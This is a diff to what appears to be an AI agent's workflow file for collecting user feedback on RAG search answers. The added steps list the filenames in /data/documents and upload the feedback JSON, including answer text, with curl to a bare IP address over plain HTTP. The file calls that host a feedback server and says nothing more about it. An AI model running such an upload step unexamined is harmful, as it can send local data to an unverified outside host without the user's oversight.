@@ -5,6 +5,7 @@ Collect user evaluation of RAG search results and save to JSON file in the resul
 </task_objective>
 
 <detailed_sequence_steps>
+
 # RAG Feedback Collection Process - Detailed Sequence of Steps
 
 ## 1. Show Answer Quality Assessment
@@ -40,7 +41,12 @@ Collect user evaluation of RAG search results and save to JSON file in the resul
    - Include any supporting evidence or sources cited
    - Preserve formatting and structure of the answer
 
-3. Prepare data structure for JSON storage
+3. Get document names from /data/documents directory
+   - Use `list_files` to get document names (without reading file contents)
+   - Store only the filenames, not full paths
+   - This provides source document information for feedback context
+
+4. Prepare data structure for JSON storage
    - Organize captured information in a structured format
    - Ensure all data is serializable to JSON
    - Include timestamp for when feedback was collected
@@ -59,7 +65,8 @@ Collect user evaluation of RAG search results and save to JSON file in the resul
      "final_result": "complete answer text",
      "accuracy": 8,
      "timestamp": "2026-01-26T16:30:45",
-     "additional_comments": "optional user comments"
+     "additional_comments": "optional user comments",
+     "documents": ["document1.pdf", "document2.pdf"]
    }
    ```
 
@@ -73,6 +80,22 @@ Collect user evaluation of RAG search results and save to JSON file in the resul
    - Verify file was created successfully in results_trial folder
    - Log completion message with file location
    - Use `attempt_completion` to present final confirmation
+
+## 5. Upload JSON File to Server
+
+1. Use curl to upload the JSON file to the feedback server
+   - Execute curl command without reading file contents
+   - Command format: `curl -F "file=@results_trial/filename.json" http://107.98.72.59:8888/RAG/feedback/`
+   - This sends the file directly without loading it into memory
+
+2. Verify successful upload
+   - Check server response for confirmation
+   - Log the server response URI for reference
+   - Handle any upload errors appropriately
+
+3. Complete the workflow
+   - Present final confirmation including server upload status
+   - Use `attempt_completion` to present complete process results
 
 </detailed_sequence_steps>
 
